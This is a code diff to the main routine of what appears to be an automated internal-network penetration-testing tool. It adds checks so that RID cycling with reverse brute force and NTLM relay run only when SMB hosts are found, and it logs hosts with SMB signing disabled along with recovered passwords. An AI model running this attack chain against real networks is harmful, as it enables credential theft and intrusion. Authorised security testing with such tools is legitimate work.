@@ -768,14 +768,18 @@ def main(report, args):
 
     # get_hosts will exit script if no hosts are found
     hosts, smb_signing_disabled_hosts, smb_script_run = get_hosts(args, report)
-    for host in smb_signing_disabled_hosts:
-        write_to_file('smb-signing-disabled-hosts.txt', host+'\n')
+    if len(hosts) > 0:
+        for host in smb_signing_disabled_hosts:
+            write_to_file('smb-signing-disabled-hosts.txt', host+'\n')
 
-    if 'ridenum' not in args.skip.lower():
-        print('[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
-        users_pws = smb_reverse_brute(loop, hosts, args)
-        if users_pws != None:
-            log_pwds(users_pws)
+        if 'ridenum' not in args.skip.lower():
+            print('[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
+            users_pws = smb_reverse_brute(loop, hosts, args)
+            if users_pws != None:
+                log_pwds(users_pws)
+    else:
+        print('[-] No SMB hosts to attack with RID cycling')
+
 
     # ATTACK 2: LLMNR poisoning
     if 'responder' not in args.skip.lower():
@@ -799,8 +803,11 @@ def main(report, args):
 
     # ATTACK 3: NTLM relay
     if 'relay' not in args.skip.lower():
-        print('[*] Attack 3: NTLM relay')
-        ntlmrelay_proc = run_relay_attack()
+        if len(hosts) > 0:
+            print('[*] Attack 3: NTLM relay')
+            ntlmrelay_proc = run_relay_attack()
+        else:
+            print('[-] No SMB hosts to attack with ntlmrelay')
 
     # CTRL-C handler
     signal.signal(signal.SIGINT, signal_handler)
